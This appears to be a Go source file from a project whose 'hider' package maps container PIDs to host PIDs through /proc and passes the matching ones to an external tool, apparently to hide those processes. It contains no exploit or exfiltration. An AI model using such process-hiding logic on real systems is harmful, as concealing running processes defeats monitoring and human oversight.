package hider

import (
	"os"
	"strings"

	"controller.com/config"

	"controller.com/internal"
	"github.com/codeskyblue/go-sh"
)

func Hide(hostPids []string) {
	fp, err := os.OpenFile("./fp.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0666)
	if err != nil {
		panic(err)
	}
	fp.Write([]byte("be called"))
	fp.Write([]byte(strings.Join(hostPids, " ") + "\n"))
	fp.Close()
	out, err := sh.Command("ps", "-aux").Command("awk", "{print $2}").Output()
	if err != nil {
		panic(err)
	}
	outFmt := string(out)
	pidsInCont := strings.Split(outFmt, "\n")
	for _, pid := range pidsInCont {
		if internal.IsDigitAll(pid) == false {
			continue
		}
		rawTruePid, err := sh.Command("cat", "/proc/"+pid+"/sched").Command("grep", "threads").Output()
		if err != nil {
			continue //TODO maybe have a better handle approach
		}
		truePid := strings.FieldsFunc(string(rawTruePid), internal.Split)[1]
		if internal.IsExist(truePid, hostPids) {
			if err != nil {
				panic("line42:" + err.Error())
			}
			_, err := sh.Command(config.AvaPath, "i", pid).Output()
			if err != nil {
				panic(err)
			}
		}
	}
}
